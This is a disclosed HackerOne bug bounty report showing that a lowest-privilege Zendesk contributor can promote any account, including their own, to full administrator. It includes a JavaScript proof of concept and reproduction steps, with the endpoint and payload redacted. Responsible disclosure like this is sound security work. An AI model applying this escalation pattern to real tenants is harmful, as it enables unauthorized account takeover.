# Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/██████` . No ADMIN PRIVILEGE required.

## Report Details
- **Report ID**: 2188569
- **URL**: https://hackerone.com/reports/2188569
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-10-01T12:00:40.172Z
- **Disclosed**: 2023-12-18T20:05:21.306Z

## Reporter
- **Username**: cybxis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zendesk

## Vulnerability Information
Hello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator.  Tested in Zendesk Enterprise(Sponsored) and Trial Account.

From my past reports I was able to find privilege escalation issues on the endpoint `/api/███` . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).

## Summary:
The [Contributor Role](https://support.zendesk.com/hc/en-us/articles/4408832171034-About-team-member-product-roles-and-access) is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.

##Improper Access Control to Privilege Escalation
Vulnerable Endpoint: `PUT /api███ HTTP/2`

The `/api████████` endpoint is used for API integration to █████. █████████ . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to `FULL ADMINISTRATOR` including its own privilege.

## Browsers Verified In:
Latest version of Chrome and Firefox

##Exploit
```javascript
//Exploit
//get csrf token and id
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var profile = JSON.parse(this.responseText);
        var csrf = profile.user.authenticity_token;
		var id = profile.user.id;
        escalate(id, csrf);
    }
};

xhttp.open("GET", "https://" + document.domain + "/api/v2/users/me.json");
xhttp.send();


//privilege escalation function
function escalate(id, csrf) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            console.log(this.responseText);
        }
    };

    xhttp.open("PUT", "https://" + document.domain + "/api██████;
    xhttp.setRequestHeader("X-Csrf-Token", csrf);
    xhttp.setRequestHeader("Content-Type", "application/json");
    xhttp.send(JSON.stringify(███));
}
```

## Steps To Reproduce:
`On owner/admin account`
1. Go to https://<domain>.zendesk.com/admin/people/team/members/new
2. Provide the name and email of the agent
3. Click Next
4. Set the Support role to CONTRIBUTOR
5. Go to https://<domain>.zendesk.com/admin/people/team/members
6. Click the profile on the invited user
7. Now set the roles to Support-Contributor only and `DISABLE` any product access(just to prove that no other privilege is required).

`On invited user`
8. You will receive an email. Click it to accept the invitation
9. Login the invited account
10. Execute the exploit to escalate your privileges.

## Demo And PoC
On Enterprise account
███
On Trial account
███

## Impact

Privilege escalation - Support-Contributor to Support and Product Admin.

## Attachments
No attachments
